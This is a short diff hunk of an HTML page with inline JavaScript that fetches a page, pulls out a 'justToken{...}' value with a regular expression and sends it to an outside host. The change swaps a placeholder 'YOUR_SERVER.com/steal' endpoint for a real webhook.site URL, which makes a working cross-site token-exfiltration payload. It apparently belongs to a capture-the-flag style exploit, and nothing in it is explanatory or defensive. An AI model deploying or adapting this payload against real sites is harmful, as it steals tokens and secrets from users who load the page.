@@ -7,7 +7,7 @@
         .then(r => r.text())
         .then(data => {
           const token = data.match(/justToken\{([^}]+)\}/)[1];
-          fetch('https://YOUR_SERVER.com/steal?token=' + token);
+          fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?token=' + token);
         });
     ">
   </body>
